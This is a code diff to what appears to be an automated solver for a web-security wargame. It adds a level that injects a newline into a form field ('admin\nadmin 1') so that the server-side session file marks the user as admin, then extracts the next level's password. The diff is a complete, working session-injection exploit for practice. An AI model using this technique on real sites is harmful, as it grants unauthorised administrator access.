@@ -448,7 +448,34 @@ def level18():
         if len(passwords) == level + 1: passwords.append(reg[1])
         print(" Password found: {}".format(passwords[level + 1]))
     else:
-        print(" Password not found")        
+        print(" Password not found")
+
+def level20():
+    d = "admin\nadmin 1"
+    print(" Session file injection {}".format(d.replace("\n", "\\n")))
+    res, reg = rex(
+        "POST",
+        "/index.php",
+        "",
+        headers={"Content-Type": "application/x-www-form-urlencoded"},
+        body="name={}".format(d),
+    )
+
+    if res.status != 200: return
+    c = res.getheader("Set-Cookie")
+    res, reg = rex(
+        "POST",
+        "/index.php",
+        "Password: (\w+)</pre>",
+        headers={"Cookie": c},
+    )
+
+    if res.status != 200: return
+    if reg:
+        if len(passwords) == level + 1: passwords.append(reg[1])
+        print(" Password found: {}".format(passwords[level + 1]))
+    else:
+        print(" Password not found")
         
 def levelN():
     print("Level {} not implemented yet".format(level))
@@ -460,7 +487,7 @@ levels = [
     level8, level9, level9, level11,
     level12, level12, level14, level15,
     level16, level17, level18, level18,
-    levelN, levelN, levelN, levelN,
+    level20, levelN, levelN, levelN,
     levelN, levelN, levelN, levelN,
     levelN, levelN, levelN, levelN,
     levelN, levelN, levelN,
